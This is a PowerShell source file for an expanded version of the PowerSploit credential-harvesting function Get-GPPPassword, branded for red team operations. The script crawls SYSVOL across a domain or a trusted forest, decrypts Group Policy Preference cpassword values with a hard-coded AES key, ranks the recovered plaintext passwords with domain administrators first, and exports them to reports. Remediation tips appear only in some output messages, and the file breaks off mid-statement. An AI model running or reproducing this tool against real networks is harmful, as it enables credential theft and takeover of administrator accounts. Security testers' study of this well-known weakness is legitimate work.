function Get-GPPPassword {
    <#
    .SYNOPSIS
    Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.

    PowerSploit Function: Get-GPPPassword (Enhanced Edition)
    Author: Chris Campbell (@obscuresec) - Enhanced by Community
    License: BSD 3-Clause

    .DESCRIPTION
    Get-GPPPassword searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml 
    and returns plaintext passwords with enhanced UI/UX features including progress indicators, color-coded output,
    interactive filtering, and export options.

    .EXAMPLE
    Get-GPPPassword
    Scans current domain with enhanced UI showing progress and color-coded results.

    .EXAMPLE
    Get-GPPPassword -SearchForest -ExportPath C:\Reports\gpp_results.html
    Scans entire forest and exports HTML report.

    .EXAMPLE
    Get-GPPPassword -Filter Admins -GridView
    Filters for admin accounts only and displays in GridView.
    #>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWMICmdlet', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]$Server = $Env:USERDNSDOMAIN,

        [Switch]$SearchForest,

        [ValidateSet('All', 'NonBlank', 'Recent', 'Admins')]
        [String]$Filter = 'All',

        [Switch]$Interactive,
        [Switch]$GridView,
        [String]$ExportPath,
        [Switch]$CopyToClipboard,
        [Switch]$Quiet,
        [Switch]$Force
    )

    # ============================================================================
    # SCRIPT-LEVEL VARIABLES
    # ============================================================================
    $Script:StartTime = Get-Date
    $Script:DomainsScanned = 0
    $Script:FilesAnalyzed = 0
    $Script:PasswordsFound = 0
    $Script:BlankPasswords = 0
    
    # Common passwords database for red team analysis
    $Script:CommonPasswords = @(
        'password', 'Password', 'PASSWORD', 'admin', 'Admin', 'ADMIN', '123456', '12345678', 
        '123456789', 'welcome', 'Welcome', 'qwerty', 'letmein', 'admin123', 'password1', 
        '123123', 'password123', 'changeme', 'P@ssw0rd', 'P@ssword', 'Welcome1', 'Welcome123'
    )

    # ============================================================================
    # HELPER FUNCTIONS
    # ============================================================================

    function Write-ColorOutput {
        Param(
            [String]$Message,
            [String]$ForegroundColor = 'White',
            [Switch]$NoNewline
        )
        if (-not $Quiet) {
            if ($NoNewline) {
                Write-Host $Message -ForegroundColor $ForegroundColor -NoNewline
            } else {
                Write-Host $Message -ForegroundColor $ForegroundColor
            }
        }
    }

    $Host.UI.RawUI.WindowTitle = "GPP Password Scanner - Red Team Operations"
    function prompt { "GPPPassword_Scanner> " }

    function Write-Banner {
        if ($Quiet) { return }
        
        Write-Host ""
        Write-ColorOutput "=============================================================" -ForegroundColor Cyan
        Write-ColorOutput "       Group Policy Preference Password Scanner             " -ForegroundColor Cyan
        Write-ColorOutput "                   Enhanced Edition                          " -ForegroundColor Cyan
        Write-ColorOutput "=============================================================" -ForegroundColor Cyan
        Write-Host ""
    }

    function Write-ScanProgress {
        Param(
            [String]$Activity,
            [String]$Status,
            [Int]$PercentComplete,
            [String]$CurrentOperation
        )
        if (-not $Quiet) {
            Write-Progress -Activity $Activity `
                          -Status $Status `
                          -PercentComplete $PercentComplete `
                          -CurrentOperation $CurrentOperation
        }
    }

    function Write-Summary {
        Param($Results)
        
        if ($Quiet) { return }

        $Elapsed = (Get-Date) - $Script:StartTime
        
        Write-Host ""
        Write-ColorOutput "==================== SCAN SUMMARY =====================" -ForegroundColor Cyan
        Write-ColorOutput "Scan Duration:          $($Elapsed.Minutes)m $($Elapsed.Seconds)s" -ForegroundColor Cyan
        Write-ColorOutput "Domains Scanned:        $Script:DomainsScanned" -ForegroundColor Cyan
        Write-ColorOutput "Files Analyzed:         $Script:FilesAnalyzed" -ForegroundColor Cyan
        Write-ColorOutput "Passwords Found:        $Script:PasswordsFound" -ForegroundColor $(if ($Script:PasswordsFound -gt 0) { 'Red' } else { 'Green' })
        Write-ColorOutput "Blank Passwords:        $Script:BlankPasswords" -ForegroundColor Cyan
        
        if ($Results.Count -gt 0) {
            $CriticalCount = ($Results | Where-Object { $_.Severity -eq 'CRITICAL' }).Count
            $HighCount = ($Results | Where-Object { $_.Severity -eq 'HIGH' }).Count
            $MediumCount = ($Results | Where-Object { $_.Severity -eq 'MEDIUM' }).Count
            $LowCount = ($Results | Where-Object { $_.Severity -eq 'LOW' }).Count
            $CommonPassCount = ($Results | Where-Object { $_.IsCommonPassword }).Count
            
            Write-Host ""
            Write-ColorOutput "Critical Findings:      $CriticalCount (Domain Admins)" -ForegroundColor $(if ($CriticalCount -gt 0) { 'Red' } else { 'Gray' })
            Write-ColorOutput "High Risk Findings:     $HighCount (Admins/Services/Common)" -ForegroundColor $(if ($HighCount -gt 0) { 'Red' } else { 'Gray' })
            Write-ColorOutput "Medium Risk Findings:   $MediumCount (Other Accounts)" -ForegroundColor $(if ($MediumCount -gt 0) { 'Yellow' } else { 'Gray' })
            Write-ColorOutput "Low Risk Findings:      $LowCount (Blank Passwords)" -ForegroundColor $(if ($LowCount -gt 0) { 'Cyan' } else { 'Gray' })
            
            if ($CommonPassCount -gt 0) {
                Write-ColorOutput "Common Passwords:       $CommonPassCount (Easily Guessable!)" -ForegroundColor Red
            }
        }
        
        Write-ColorOutput "=======================================================" -ForegroundColor Cyan
        Write-Host ""

        if ($Results.Count -eq 0) {
            Write-ColorOutput "SUCCESS: No passwords found - your Group Policy Preferences appear secure!" -ForegroundColor Green
            Write-Host ""
        } else {
            Write-ColorOutput "WARNING: ACTION REQUIRED:" -ForegroundColor Red
            Write-ColorOutput "  1. Change these passwords immediately" -ForegroundColor Yellow
            Write-ColorOutput "  2. Use LAPS (Local Administrator Password Solution)" -ForegroundColor Yellow
            Write-ColorOutput "  3. Review KB2962486 for remediation steps" -ForegroundColor Yellow
            Write-ColorOutput "  4. Remove cpassword from existing GPP XML files" -ForegroundColor Yellow
            Write-ColorOutput "  5. Implement stronger password policies for service accounts" -ForegroundColor Yellow
            Write-Host ""
        }
    }

    function Get-DecryptedCpassword {
        [CmdletBinding()]
        Param ([string]$Cpassword)

        try {
            # Append appropriate padding based on string length
            $Mod = ($Cpassword.length % 4)
            switch ($Mod) {
                '1' { $Cpassword = $Cpassword.Substring(0, $Cpassword.Length -1) }
                '2' { $Cpassword += ('=' * (4 - $Mod)) }
                '3' { $Cpassword += ('=' * (4 - $Mod)) }
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            [System.Reflection.Assembly]::LoadWithPartialName("System.Core") | Out-Null

            # Create AES Crypto Object with Microsoft's published key
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]]$AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)

            $AesIV = New-Object Byte[]($AesObject.IV.Length)
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor()
            [Byte[]]$OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)

            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        }
        catch { 
            Write-Verbose "(Get-DecryptedCpassword) Error decrypting: $_"
            return $null
        }
    }

    function Get-GPPInnerField {
        [CmdletBinding()]
        Param ($File)

        try {
            $Filename = Split-Path $File -Leaf
            [xml]$Xml = Get-Content ($File) -ErrorAction Stop

            if ($Xml.innerxml -match 'cpassword') {
                $Xml.GetElementsByTagName('Properties') | ForEach-Object {
                    if ($_.cpassword) {
                        $Cpassword = $_.cpassword
                        if ($Cpassword -and ($Cpassword -ne '')) {
                           $DecryptedPassword = Get-DecryptedCpassword $Cpassword
                           if ($DecryptedPassword) {
                               $Password = $DecryptedPassword
                               Write-Verbose "(Get-GPPInnerField) Decrypted password in '$File'"
                               $Script:PasswordsFound++
                           } else {
                               $Password = 'DECRYPTION-FAILED'
                           }
                        } else {
                            $Password = 'BLANK'
                            $Script:BlankPasswords++
                        }

                        # Extract user information
                        $UserName = if ($_.userName) { $_.userName }
                                   elseif ($_.accountName) { $_.accountName }
                                   elseif ($_.runAs) { $_.runAs }
                                   else { 'BLANK' }

                        $NewName = if ($_.newName) { $_.newName } else { 'BLANK' }
                        $Changed = try { $_.ParentNode.changed } catch { 'BLANK' }
                        $NodeName = try { $_.ParentNode.ParentNode.LocalName } catch { 'BLANK' }

                        # Extract GPO information from file path
                        $GPOName = "Unknown"
                        $GPODomain = "Unknown"
                        if ($File -match "\\\\([^\\]+)\\SYSVOL\\([^\\]+)\\Policies\\{([^}]+)}") {
                            $GPODomain = $matches[1]
                            $GPOId = $matches[3]
                            try {
                                $GPO = [ADSI]"LDAP://CN={$GPOId},CN=Policies,CN=System,DC=$($GPODomain.Replace('.', ',DC='))"
                                $GPOName = if ($GPO.displayName.Value) { $GPO.displayName.Value } else { $GPOId }
                            }
                            catch {
                                $GPOName = $GPOId
                            }
                        }

                        # Calculate password age
                        $PasswordAge = 'UNKNOWN'
                        if ($Changed -ne 'BLANK') {
                            try {
                                $ChangedDate = [DateTime]$Changed
                                $DaysOld = (New-TimeSpan -Start $ChangedDate -End (Get-Date)).Days
                                $PasswordAge = "$DaysOld days"
                            }
                            catch {
                                $PasswordAge = 'INVALID-DATE'
                            }
                        }

                        # Determine account type
                        $AccountType = switch ($NodeName) {
                            'Groups' { 'Local Group' }
                            'ScheduledTasks' { 'Scheduled Task' }
                            'Services' { 'Service Account' }
                            'DataSources' { 'Data Source' }
                            'Printers' { 'Printer Account' }
                            'Drives' { 'Drive Mapping' }
                            default { 'Unknown' }
                        }

                        # Analyze password complexity
                        $PasswordLength = if ($Password -ne 'BLANK' -and $Password -ne 'DECRYPTION-FAILED') { $Password.Length } else { 0 }
                        $HasUppercase = if ($Password -match '[A-Z]') { $true } else { $false }
                        $HasLowercase = if ($Password -match '[a-z]') { $true } else { $false }
                        $HasNumbers = if ($Password -match '\d') { $true } else { $false }
                        $HasSpecial = if ($Password -match '[^a-zA-Z0-9]') { $true } else { $false }
                        
                        $ComplexityScore = 0
                        if ($HasUppercase) { $ComplexityScore++ }
                        if ($HasLowercase) { $ComplexityScore++ }
                        if ($HasNumbers) { $ComplexityScore++ }
                        if ($HasSpecial) { $ComplexityScore++ }
                        
                        $IsCommonPassword = if ($Password -ne 'BLANK' -and $Password -ne 'DECRYPTION-FAILED') {
                            $Script:CommonPasswords -contains $Password
                        } else { $false }
                        
                        $PasswordStrength = if ($Password -eq 'BLANK' -or $Password -eq 'DECRYPTION-FAILED') {
                            'N/A'
                        } elseif ($IsCommonPassword) {
                            'Very Weak (Common)'
                        } elseif ($PasswordLength -lt 8) {
                            'Very Weak'
                        } elseif ($ComplexityScore -eq 1) {
                            'Weak'
                        } elseif ($ComplexityScore -eq 2) {
                            'Moderate'
                        } elseif ($ComplexityScore -eq 3) {
                            'Strong'
                        } else {
                            'Very Strong'
                        }

                        # Determine severity
                        $IsAdmin = $UserName -match 'admin|administrator|root'
                        $IsDomainAdmin = $UserName -match '.*\\Administrator' -or $UserName -eq 'Administrator'
                        $IsServiceAccount = $AccountType -eq 'Service Account'
                        
                        $Severity = if ($IsDomainAdmin) { 'CRITICAL' }
                                   elseif ($IsAdmin -and $Password -ne 'BLANK') { 'HIGH' }
                                   elseif ($IsCommonPassword) { 'HIGH' }
                                   elseif ($IsServiceAccount -and $Password -ne 'BLANK') { 'HIGH' }
                                   elseif ($Password -eq 'BLANK') { 'LOW' }
                                   else { 'MEDIUM' }

                        # Create result object
                        $GPPPassword = New-Object PSObject -Property @{
                            'Severity'           = $Severity
                            'UserName'           = $UserName
                            'NewName'            = $NewName
                            'Password'           = $Password
                            'PasswordLength'     = $PasswordLength
                            'PasswordStrength'   = $PasswordStrength
                            'IsCommonPassword'   = $IsCommonPassword
                            'Changed'            = $Changed
                            'PasswordAge'        = $PasswordAge
                            'File'               = $File
                            'GPOName'            = $GPOName
                            'GPODomain'          = $GPODomain
                            'AccountType'        = $AccountType
                            'NodeName'           = $NodeName
                            'Cpassword'          = $Cpassword
                            'HasUppercase'       = $HasUppercase
                            'HasLowercase'       = $HasLowercase
                            'HasNumbers'         = $HasNumbers
                            'HasSpecial'         = $HasSpecial
                            'ComplexityScore'    = $ComplexityScore
                        }
                        $GPPPassword
                    }
                }
            }
        }
        catch {
            Write-Verbose "(Get-GPPInnerField) Error parsing file '$File' : $_"
        }
    }

    function Get-DomainTrust {
        [CmdletBinding()]
        Param ($Domain)

        if (Test-Connection -Count 1 -Quiet -ComputerName $Domain) {
            try {
                $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
                $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
                if ($DomainObject) {
                    $DomainObject.GetAllTrustRelationships() | Select-Object -ExpandProperty TargetName
                }
            }
            catch {
                Write-Verbose "(Get-DomainTrust) Error contacting domain '$Domain' : $_"
            }

            try {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Domain)
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
                if ($ForestObject) {
                    $ForestObject.GetAllTrustRelationships() | Select-Object -ExpandProperty TargetName
                }
            }
            catch {
                Write-Verbose "(Get-DomainTrust) Error contacting forest '$Domain' : $_"
            }
        }
    }

    function Get-DomainTrustMapping {
        [CmdletBinding()]
        Param ()

        $SeenDomains = @{}
        $Domains = New-Object System.Collections.Stack

        try {
            $CurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | 
                            Select-Object -ExpandProperty Name
            $CurrentDomain
        }
        catch {
            Write-Warning "(Get-DomainTrustMapping) Error enumerating current domain: $_"
        }

        if ($CurrentDomain -and $CurrentDomain -ne '') {
            $Domains.Push($CurrentDomain)

            while($Domains.Count -ne 0) {
                $Domain = $Domains.Pop()

                if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {
                    Write-Verbose "(Get-DomainTrustMapping) Enumerating trusts for domain: '$Domain'"
                    $Null = $SeenDomains.Add($Domain, '')

                    try {
                        Get-DomainTrust -Domain $Domain | Sort-Object -Unique | ForEach-Object {
                            if (-not $SeenDomains.ContainsKey($_) -and (Test-Connection -Count 1 -Quiet -ComputerName $_)) {
                                $Null = $Domains.Push($_)
                                $_
                            }
                        }
                    }
                    catch {
                        Write-Verbose "(Get-DomainTrustMapping) Error: $_"
                    }
                }
            }
        }
    }

    function Show-InteractiveMenu {
        Write-Banner
        Write-ColorOutput "Select Scan Mode:" -ForegroundColor Cyan
        Write-ColorOutput "  1) Quick Scan - Current Domain Only" -ForegroundColor White
        Write-ColorOutput "  2) Full Forest Scan - All Trusts" -ForegroundColor White
        Write-ColorOutput "  3) Specify Custom Domain" -ForegroundColor White
        Write-ColorOutput "  4) Exit" -ForegroundColor White
        Write-Host ""
        
        $Choice = Read-Host "Enter choice (1-4)"
        
        switch ($Choice) {
            '1' { 
                $Script:SearchForest = $false
                $Script:Server = $Env:USERDNSDOMAIN
                return $true
            }
            '2' { 
                Write-ColorOutput "`nWARNING: Forest-wide scans may take considerable time." -ForegroundColor Yellow
                $Confirm = Read-Host "Continue? (Y/N)"
                if ($Confirm -eq 'Y' -or $Confirm -eq 'y') {
                    $Script:SearchForest = $true
                    return $true
                }
                return $false
            }
            '3' { 
                $CustomDomain = Read-Host "`nEnter domain name"
                if ($CustomDomain) {
                    $Script:Server = $CustomDomain
                    $Script:SearchForest = $false
                    return $true
                }
                return $false
            }
            '4' { 
                Write-ColorOutput "Exiting..." -ForegroundColor Yellow
                return $false
            }
            default { 
                Write-ColorOutput "Invalid choice. Exiting." -ForegroundColor Red
                return $false
            }
        }
    }

    function Export-Results {
        Param($Results, [String]$Path)

        if (-not $Path) { return }

        $Extension = [System.IO.Path]::GetExtension($Path).ToLower()

        try {
            switch ($Extension) {
                '.csv' {
                    $Results | Export-Csv -Path $Path -NoTypeInformation -Force
                    Write-ColorOutput "SUCCESS: Results exported to CSV: $Path" -ForegroundColor Green
                }
                '.json' {
                    $Results | ConvertTo-Json -Depth 3 | Out-File -FilePath $Path -Force
                    Write-ColorOutput "SUCCESS: Results exported to JSON: $Path" -ForegroundColor Green
                }
                '.html' {
                    $HTML = @"
<!DOCTYPE html>
<html>
<head>
    <title>GPP Password Scan Results - Red Team Analysis</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
        h1 { color: #333; }
        .summary { background-color: #e3f2fd; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .warning { background-color: #fff3cd; padding: 15px; border-radius: 5px; margin-bottom: 20px; border-left: 4px solid #ffc107; }
        table { border-collapse: collapse; width: 100%; background-color: white; box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-bottom: 20px; }
        th { background-color: #1976d2; color: white; padding: 12px; text-align: left; position: sticky; top: 0; }
        td { padding: 10px; border-bottom: 1px solid #ddd; }
        tr:hover { background-color: #f5f5f5; }
        .critical { background-color: #ffcdd2; }
        .high { background-color: #fff9c4; }
        .medium { background-color: #e1f5fe; }
        .low { background-color: #c8e6c9; }
        .common-pwd { border-left: 4px solid #d32f2f; }
        .strength-very-weak { color: #d32f2f; font-weight: bold; }
        .strength-weak { color: #f57c00; }
        .strength-moderate { color: #fbc02d; }
        .strength-strong { color: #388e3c; }
        .strength-very-strong { color: #1976d2; font-weight: bold; }
        .footer { margin-top: 20px; font-size: 12px; color: #666; }
        .stats { display: flex; justify-content: space-around; margin-bottom: 20px; }
        .stat-box { background: white; padding: 15px; border-radius: 5px; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .stat-value { font-size: 24px; font-weight: bold; }
        .stat-label { font-size: 12px; color: #666; margin-top: 5px; }
    </style>
</head>
<body>
    <h1>Group Policy Preference Password Scan Results</h1>
    <div class="summary">
        <strong>Scan Date:</strong> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')<br>
        <strong>Domains Scanned:</strong> $Script:DomainsScanned<br>
        <strong>Files Analyzed:</strong> $Script:FilesAnalyzed<br>
        <strong>Passwords Found:</strong> $Script:PasswordsFound<br>
        <strong>Blank Passwords:</strong> $Script:BlankPasswords
    </div>
    
    <div class="stats">
        <div class="stat-box">
            <div class="stat-value" style="color: #d32f2f;">$($Results | Where-Object { $_.Severity -eq 'CRITICAL' }).Count</div>
            <div class="stat-label">CRITICAL</div>
        </div>
        <div class="stat-box">
            <div class="stat-value" style="color: #f57c00;">$($Results | Where-Object { $_.Severity -eq 'HIGH' }).Count</div>
            <div class="stat-label">HIGH</div>
        </div>
        <div class="stat-box">
            <div class="stat-value" style="color: #1976d2;">$($Results | Where-Object { $_.Severity -eq 'MEDIUM' }).Count</div>
            <div class="stat-label">MEDIUM</div>
        </div>
        <div class="stat-box">
            <div class="stat-value" style="color: #388e3c;">$($Results | Where-Object { $_.Severity -eq 'LOW' }).Count</div>
            <div class="stat-label">LOW</div>
        </div>
        <div class="stat-box">
            <div class="stat-value" style="color: #d32f2f;">$($Results | Where-Object { $_.IsCommonPassword }).Count</div>
            <div class="stat-label">COMMON PASSWORDS</div>
        </div>
    </div>
"@
                    # Add warning if common passwords found
                    $CommonPwdCount = ($Results | Where-Object { $_.IsCommonPassword }).Count
                    if ($CommonPwdCount -gt 0) {
                        $HTML += @"
    <div class="warning">
        <strong>⚠️ WARNING:</strong> $CommonPwdCount common/weak password(s) detected that are easily guessable!
    </div>
"@
                    }
                    
                    $HTML += @"
    <table>
        <tr>
            <th>Severity</th>
            <th>Username</th>
            <th>Password</th>
            <th>Length</th>
            <th>Strength</th>
            <th>Age</th>
            <th>Account Type</th>
            <th>GPO</th>
            <th>Domain</th>
        </tr>
"@
                    foreach ($Result in $Results) {
                        $RowClass = switch ($Result.Severity) {
                            'CRITICAL' { 'critical' }
                            'HIGH' { 'high' }
                            'MEDIUM' { 'medium' }
                            'LOW' { 'low' }
                            default { '' }
                        }
                        if ($Result.IsCommonPassword) { $RowClass += ' common-pwd' }
                        
                        $StrengthClass = switch ($Result.PasswordStrength) {
                            'Very Weak' { 'strength-very-weak' }
                            'Very Weak (Common)' { 'strength-very-weak' }
                            'Weak' { 'strength-weak' }
                            'Moderate' { 'strength-moderate' }
                            'Strong' { 'strength-strong' }
                            'Very Strong' { 'strength-very-strong' }
                            default { '' }
                        }
                        
                        $CommonIndicator = if ($Result.IsCommonPassword) { " 🚨" } else { "" }
                        
                        $HTML += @"
        <tr class="$RowClass">
            <td>$($Result.Severity)</td>
            <td>$($Result.UserName)</td>
            <td>$($Result.Password)$CommonIndicator</td>
            <td>$($Result.PasswordLength)</td>
            <td class="$StrengthClass">$($Result.PasswordStrength)</td>
            <td>$($Result.PasswordAge)</td>
            <td>$($Result.AccountType)</td>
            <td style="font-size: 10px;">$($Result.GPOName)</td>
            <td style="font-size: 10px;">$($Result.GPODomain)</td>
        </tr>
"@
                    }
                    $HTML += @"
    </table>
    <div class="footer">
        Generated by Get-GPPPassword Enhanced Edition for Red Team Operations<br>
        <strong>Recommendations:</strong> Immediately change all critical/high-risk passwords, implement LAPS, and remove cpassword attributes from GPP settings.
    </div>
</body>
</html>
"@
                    $HTML | Out-File -FilePath $Path -Force
                    Write-ColorOutput "SUCCESS: Results exported to HTML: $Path" -ForegroundColor Green
                }
                '.txt' {
                    $Results | Format-Table -AutoSize | Out-File -FilePath $Path -Force -Width 200
                    Write-ColorOutput "SUCCESS: Results exported to TXT: $Path" -ForegroundColor Green
                }
                default {
                    Write-ColorOutput "WARNING: Unsupported export format. Use .csv, .json, .html, or .txt" -ForegroundColor Yellow
                }
            }
        }
        catch {
            Write-ColorOutput "ERROR: Export failed: $_" -ForegroundColor Red
        }
    }

    function Show-ColoredResults {
        Param($Results)

        if ($Quiet -or $Results.Count -eq 0) { return }

        # Show common password findings first
        $CommonPasswordResults = $Results | Where-Object { $_.IsCommonPassword }
        if ($CommonPasswordResults) {
            Write-Host ""
            Write-ColorOutput "========== COMMON PASSWORDS DETECTED (Easily Guessable!) ==========" -ForegroundColor Red
            Write-ColorOutput "These passwords are in common password lists and should be changed IMMEDIATELY!" -ForegroundColor Red
            Write-Host ""
            $CommonPasswordResults | Format-Table -Property @{
                Label="Username"; Expression={$_.UserName}; Width=25
            }, @{
                Label="Password"; Expression={$_.Password}; Width=20
            }, @{
                Label="Account Type"; Expression={$_.AccountType}; Width=18
            }, @{
                Label="GPO"; Expression={$_.GPOName}; Width=30
            }, @{
                Label="Domain"; Expression={$_.GPODomain}; Width=20
            } -AutoSize
        }

        # Group by severity
        $CriticalResults = $Results | Where-Object { $_.Severity -eq 'CRITICAL' }
        $HighResults = $Results | Where-Object { $_.Severity -eq 'HIGH' }
        $MediumResults = $Results | Where-Object { $_.Severity -eq 'MEDIUM' }
        $LowResults = $Results | Where-Object { $_.Severity -eq 'LOW' }

        if ($CriticalResults) {
            Write-Host ""
            Write-ColorOutput "========== CRITICAL - Domain Administrator Accounts ==========" -ForegroundColor Red
            $CriticalResults | Format-Table -Property @{
                Label="Username"; Expression={$_.UserName}; Width=25
            }, @{
                Label="Password"; Expression={$_.Password}; Width=20
            }, @{
                Label="Strength"; Expression={$_.PasswordStrength}; Width=15
            }, @{
                Label="Age"; Expression={$_.PasswordAge}; Width=12
            }, @{
                Label="GPO"; Expression={$_.GPOName}; Width=30
            } -AutoSize
        }

        if ($HighResults) {
            Write-Host ""
            Write-ColorOutput "========== HIGH - Administrator/Service Accounts ==========" -ForegroundColor Yellow
            $HighResults | Format-Table -Property @{
                Label="Username"; Expression={$_.UserName}; Width=25
            }, @{
                Label="Password"; Expression={$_.Password}; Width=20
            }, @{
                Label="Strength"; Expression={$_.PasswordStrength}; Width=15
            }, @{
                Label="Type"; Expression={$_.AccountType}; Width=18
            }, @{
                Label="Age"; Expression={$_.PasswordAge}; Width=12
            } -AutoSize
        }

        if ($MediumResults) {
            Write-Host ""
            Write-ColorOutput "========== MEDIUM - Standard Accounts ==========" -ForegroundColor White
            $MediumResults | Format-Table -Property @{
                Label="Username"; Expression={$_.UserName}; Width=25
            }, @{
                Label="Password"; Expression={$_.Password}; Width=20
            }, @{
                Label="Strength"; Expression={$_.PasswordStrength}; Width=15
            }, @{
                Label="Type"; Expression={$_.AccountType}; Width=18
            } -AutoSize
        }

        if ($LowResults) {
            Write-Host ""
            Write-ColorOutput "========== LOW - Blank/Empty Passwords ==========" -ForegroundColor Cyan
            $LowResults | Format-Table -Property @{
                Label="Username"; Expression={$_.UserName}; Width=25
            }, @{
                Label="Password"; Expression={$_.Password}; Width=20
            }, @{
                Label="Type"; Expression={$_.AccountType}; Width=18
            }, @{
                Label="File"; Expression={Split-Path $_.File -Leaf}; Width=30
            } -AutoSize
        }
    }

    # ============================================================================
    # MAIN EXECUTION LOGIC
    # ============================================================================

    try {
        # Handle interactive mode
        if ($Interactive) {
            if (-not (Show-InteractiveMenu)) { return }
        }

        # Confirmation for forest scan
        if ($SearchForest -and -not $Force -and -not $Quiet) {
            Write-ColorOutput "`nWARNING: Searching all forest trusts may take significant time." -ForegroundColor Yellow
            $Confirmation = Read-Host "Continue with forest-wide scan? (Y/N)"
            if ($Confirmation -ne 'Y' -and $Confirmation -ne 'y') {
                Write-ColorOutput "Scan cancelled by user." -ForegroundColor Yellow
                return
            }
        }

        Write-Banner

        $XMLFiles = New-Object System.Collections.ArrayList
        $Domains = @()
        $AllUsers = if ($Env:ALLUSERSPROFILE) { $Env:ALLUSERSPROFILE } else { 'C:\ProgramData' }

        # Scan local cache
        Write-ColorOutput "[*] Scanning local cache..." -ForegroundColor Cyan
        Write-ScanProgress -Activity "Scanning for GPP Files" -Status "Searching local cache" -PercentComplete 10 -CurrentOperation "Checking $AllUsers"
        
        $LocalFiles = Get-ChildItem -Path $AllUsers -Recurse `
            -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' `
            -Force -ErrorAction SilentlyContinue
        
        if ($LocalFiles) {
            $null = $XMLFiles.AddRange(@($LocalFiles))
            Write-ColorOutput "  SUCCESS: Found $($LocalFiles.Count) local cached file(s)" -ForegroundColor Green
        } else {
            Write-ColorOutput "  INFO: No local cached files found" -ForegroundColor Gray
        }

        # Determine domains to scan
        if ($SearchForest) {
            Write-ColorOutput "[*] Discovering forest trusts..." -ForegroundColor Cyan
            Write-ScanProgress -Activity "Scanning for GPP Files" -Status "Enumerating trusts" -PercentComplete 20 -CurrentOperation "Mapping domain trusts"
            $Domains += Get-DomainTrustMapping
        }
        else {
            if ($Server) {
                $Domains += , $Server
            }
            else {
                try {
                    $Domains += , [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | 
                                Select-Object -ExpandProperty Name
                }
                catch {
                    Write-Warning "Could not determine current domain: $_"
                }
            }
        }

        $Domains = $Domains | Where-Object {$_} | Sort-Object -Unique
        $Script:DomainsScanned = $Domains.Count

        if ($Domains.Count -gt 0) {
            Write-ColorOutput "  SUCCESS: Found $($Domains.Count) domain(s) to scan" -ForegroundColor Green
        }

        # Scan each domain
        $DomainCounter = 0
        ForEach ($Domain in $Domains) {
            $DomainCounter++
            $PercentComplete = 20 + (($DomainCounter / $Domains.Count) * 60)
            
            Write-ColorOutput "[*] Scanning domain: $Domain" -ForegroundColor Cyan
            Write-ScanProgress -Activity "Scanning for GPP Files" `
                              -Status "Domain $DomainCounter of $($Domains.Count): $Domain" `
                              -PercentComplete $PercentComplete `
                              -CurrentOperation "Searching SYSVOL share"
            
            try {
                $DomainXMLFiles = Get-ChildItem -Force -Path "\\$Domain\SYSVOL\*\Policies" `
                    -Recurse -ErrorAction SilentlyContinue `
                    -Include @('Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml')

                if($DomainXMLFiles) {
                    $null = $XMLFiles.AddRange(@($DomainXMLFiles))
                    Write-ColorOutput "  SUCCESS: Found $($DomainXMLFiles.Count) file(s) in $Domain" -ForegroundColor Green
                } else {
                    Write-ColorOutput "  INFO: No GPP files found in $Domain" -ForegroundColor Gray
                }
            }
            catch {
                Write-ColorOutput "  ERROR: Error accessing $Domain : $_" -ForegroundColor Red
            }
        }

        $Script:FilesAnalyzed = $XMLFiles.Count

        if ($XMLFiles.Count -eq 0) {
            Write-ColorOutput "`nSUCCESS: No GPP preference files found - nothing to analyze!" -ForegroundColor Green
            Write-Summary -Results @()
            return
        }

        Write-ColorOutput "`n[*] Analyzing $($XMLFiles.Count) file(s) for passwords..." -ForegroundColor Cyan
        Write-Host ""

        # Parse each file
        $AllResults = New-Object System.Collections.ArrayList
        $FileCounter = 0

        ForEach ($File in $XMLFiles) {
            $FileCounter++
            $PercentComplete = 80 + (($FileCounter / $XMLFiles.Count) * 15)
            
            Write-ScanProgress -Activity "Analyzing GPP Files" `
                              -Status "File $FileCounter of $($XMLFiles.Count)" `
                              -PercentComplete $PercentComplete `
                              -CurrentOperation "Parsing $($File.Name)"
            
            $Result = Get-GppInnerField $File.Fullname
            if ($Result) { $null = $AllResults.Add($Result) }
        }

        Write-ScanProgress -Activity "Analysis Complete" -Status "Finalizing results" -PercentComplete 95 -CurrentOperation "Applying filters"

        # Apply filters
        $FilteredResults = switch ($Filter) {
            'NonBlank' { $AllResults | Where-Object { $_.Password -ne 'BLANK' } }
            'Recent' { 
                $AllResults | Where-Object { 
                    if ($_.Changed -ne 'BLANK') {
                        try {
                            $ChangedDate = [DateTime]$_.Changed
